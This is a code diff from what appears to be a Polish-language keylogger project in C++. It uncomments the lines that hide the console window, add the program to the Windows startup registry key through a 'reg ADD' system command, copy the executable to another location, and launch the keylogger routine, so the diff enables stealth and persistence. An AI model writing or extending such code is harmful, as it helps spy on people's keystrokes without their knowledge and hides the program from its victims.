@@ -12,7 +12,7 @@ void doSystemu(string sciezkaKeylogger)
 {
     string komenda = "copy "+sciezkaKeylogger+" "+SCIEZKA;
     cout << komenda<<endl;
-//    system(komenda.c_str());
+    system(komenda.c_str());
 }
 void Konsola()//Ukrywanie siê konsoli
 {
@@ -46,7 +46,7 @@ void Autostart(string sciezka)//Dodawanie do autostartu
 {
     string komenda = "reg ADD HKEY_CURRENT_USER\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run /v Test /t REG_SZ /d C:\\Users\\Patryk\\Desktop\\997\\bin\\Debug\\997.exe"+sciezka;
     cout<<komenda;
-    //system(komenda.c_str());
+    system(komenda.c_str());
 }
 void ZapiszSPECIAL(string input)//Zapisywanie do pliku znaków specjalnych
 {
@@ -203,9 +203,9 @@ int main(int argc, char * argv[])
 {
      if (!Mutex())
      {
-         //Konsola();
-         //Autostart("C:\\Users\\Patryk\\Desktop\\997\\bin\\Debug\\997.exe");
-         //Keylogger();
+         Konsola();
+         Autostart("C:\\Users\\Patryk\\Desktop\\997\\bin\\Debug\\997.exe");
+         Keylogger();
          doSystemu(argv[0]);
      }
     return 0;
